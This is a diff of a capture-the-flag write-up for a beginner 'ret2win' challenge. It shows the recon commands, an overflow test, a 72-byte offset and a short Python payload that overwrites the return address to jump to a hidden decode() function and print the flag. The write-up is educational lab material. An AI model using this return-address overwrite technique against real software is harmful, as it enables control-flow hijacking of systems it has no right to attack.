@@ -10,36 +10,41 @@
 
 ---
 
-# Initial Analysis
+# Initial Thoughts
 
-The challenge title:
+The challenge name immediately gave away the general idea.
 
 ```txt
 ret2win
 ```
 
-immediately suggested a classic binary exploitation pattern:
-- stack buffer overflow
-- overwritten return address
-- redirecting execution into a hidden function
+is a very common beginner binary exploitation pattern where:
+- a buffer overflow exists
+- the return address gets overwritten
+- and execution is redirected into a hidden function.
+
+So before even opening the binary, I already expected:
+- stack overflow vulnerability
+- hidden “win” function
+- simple control-flow hijacking.
 
 ---
 
-# Inspecting the Binary
+# Looking at the Binary
 
-I first inspected the binary using:
+I first checked the file type:
 
 ```bash
 file ret2win
 ```
 
-Then extracted embedded strings:
+Then extracted readable strings:
 
 ```bash
 strings ret2win
 ```
 
-This revealed several important strings:
+Some interesting strings immediately stood out:
 
 ```txt
 Access Granted!
@@ -48,18 +53,20 @@ vuln
 decode
 ```
 
-The presence of:
-- a vulnerable-looking function (`vuln`)
-- a hidden-looking function (`decode`)
-- and flag-related output
+That was already a strong hint.
 
-strongly suggested that the binary contained a hidden success path.
+The binary clearly contained:
+- a vulnerable function (`vuln`)
+- a hidden function (`decode`)
+- and code that prints the flag.
+
+At this point, the challenge became less about “finding” the flag and more about figuring out how to redirect execution into the hidden function.
 
 ---
 
-# Enumerating Functions
+# Finding the Target Function
 
-Next, I inspected the binary symbols:
+Next, I checked the symbols inside the binary:
 
 ```bash
 nm ret2win
@@ -71,39 +78,45 @@ This revealed the address of the hidden function:
 0x4011b1
 ```
 
-The `decode()` function appeared to be the target function responsible for printing the flag.
+So now the goal was simple:
+
+> overwrite the return address and jump to `decode()`.
 
 ---
 
-# Confirming the Buffer Overflow
+# Testing for a Buffer Overflow
 
-To test for a stack overflow vulnerability, I sent oversized input:
+To confirm the overflow, I sent a very long input:
 
 ```bash
 python3 -c "print('A'*200)" | ./ret2win
 ```
 
-The program crashed, confirming that user-controlled input could overwrite stack memory.
+The program crashed.
+
+That confirmed the binary was vulnerable to a stack-based buffer overflow.
 
 ---
 
 # Finding the Offset
 
-By testing input lengths, I determined that the saved return address (RIP) was overwritten after:
+After testing different input lengths, I found that the saved return address was overwritten after:
 
 ```txt
 72 bytes
 ```
 
-This meant the exploit payload needed:
-- 72 bytes of padding
-- followed by the target function address
+So the payload structure became:
+
+```txt
+[72 bytes padding] + [address of decode()]
+```
 
 ---
 
-# Crafting the Exploit
+# Building the Payload
 
-I constructed the payload using Python:
+I used Python to craft the exploit:
 
 ```python
 import sys
@@ -114,18 +127,15 @@ payload = b"A"*72 + struct.pack("<Q", 0x4011b1)
 sys.stdout.buffer.write(payload)
 ```
 
-The payload worked as follows:
-
-| Component | Purpose |
-|---|---|
-| `b"A"*72` | fills the buffer and overwrites saved stack data |
-| `struct.pack("<Q", 0x4011b1)` | overwrites RIP with the address of `decode()` |
+Here:
+- `b"A"*72` fills the buffer
+- `struct.pack("<Q", 0x4011b1)` overwrites RIP with the address of `decode()`.
 
 ---
 
 # Exploitation
 
-Running the exploit:
+Running the payload:
 
 ```bash
 python3 exploit.py | ./ret2win
@@ -135,16 +145,19 @@ produced:
 
 ```txt
 Access Granted!
-
+Flag: SecLeaf{sm4sh_th3_st4ck}
 ```
+
+The exploit successfully redirected execution flow into the hidden function.
 
 ---
 
-# Key Takeaways
+# What This Challenge Teaches
 
-This challenge demonstrated:
-- stack-based buffer overflows
-- ret2win exploitation
-- control-flow hijacking
-- basic binary exploitation workflow
+This challenge is a classic introduction to binary exploitation.
 
+The important idea is:
+
+> instead of injecting new code, we reuse code that already exists inside the binary.
+
+By overflowing the stack and overwriting the saved return address, execution can be redirected anywhere we want.
